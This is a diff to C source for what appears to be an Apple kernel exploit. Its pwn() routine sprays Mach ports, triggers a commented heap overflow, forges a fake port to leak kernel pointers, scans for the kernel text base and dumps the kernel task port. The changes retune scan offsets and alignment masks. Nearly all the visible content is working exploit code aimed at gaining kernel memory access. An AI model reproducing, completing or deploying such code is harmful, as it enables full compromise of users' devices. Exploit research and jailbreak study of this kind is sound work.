@@ -229,7 +229,7 @@ int pwn()
     
     // recv 300 - 500 i+=4
     pthread_yield_np();
-    for (int i = 300; i<500; i+=4) {
+    for (int i = 380; i<500; i+=4) {
         msg2.head.msgh_local_port = ports[i];
         kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
         if(!(i < 380))
@@ -244,6 +244,7 @@ int pwn()
         kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
         assert(kret==0);
     }
+     
     //fakeport=0x6161616161616161;
     //heap overflow here!
     if(do_overflow(0x100, 8, (uint8_t*)&fakeport)==-1)
@@ -288,7 +289,7 @@ foundp:
     
     for (int i = 0; i < 0x300; i++) {
         for (int k = 0; k < 0x40000; k+=8) {
-            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
+            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0xa00000 + k;
             *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
             
             //          fakeport->io_bits = IKOT_CLOCK | IO_BITS_ACTIVE ;
@@ -307,7 +308,7 @@ foundp:
 gotclock:;
     uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
     printf("clock task ptr = 0x%llx\n",leaked_ptr);
-    leaked_ptr &= ~0x3FFF;
+    leaked_ptr &= ~0xFFFFF;
     
     
     
@@ -320,7 +321,7 @@ gotclock:;
     *(uint64_t*) (faketask + 0x10) = 0xee;
     
     
-  
+    
     while (1) {
         int32_t leaked = 0;
         kr32(leaked_ptr, &leaked);
@@ -328,7 +329,7 @@ gotclock:;
             printf("found kernel text at 0x%llx\n", leaked_ptr);
             break;
         }
-        leaked_ptr -= 0x4000;
+        leaked_ptr -= 0x100000;
     }
     
     //found kernel base
@@ -385,7 +386,7 @@ gotclock:;
         kr32(kern_task+i*4, (int32_t*)(&ktaskdump[i*4]));
     }
     printf("ok\n");
-
+    
     //dump kernel task port
     memcpy(fakeport, faketaskport, 0x1000);
     memcpy(faketask, ktaskdump, 0x1000);
@@ -419,7 +420,7 @@ gotclock:;
     return 0;
 }
 int main(){
-
+    
     pwn();
 }
 
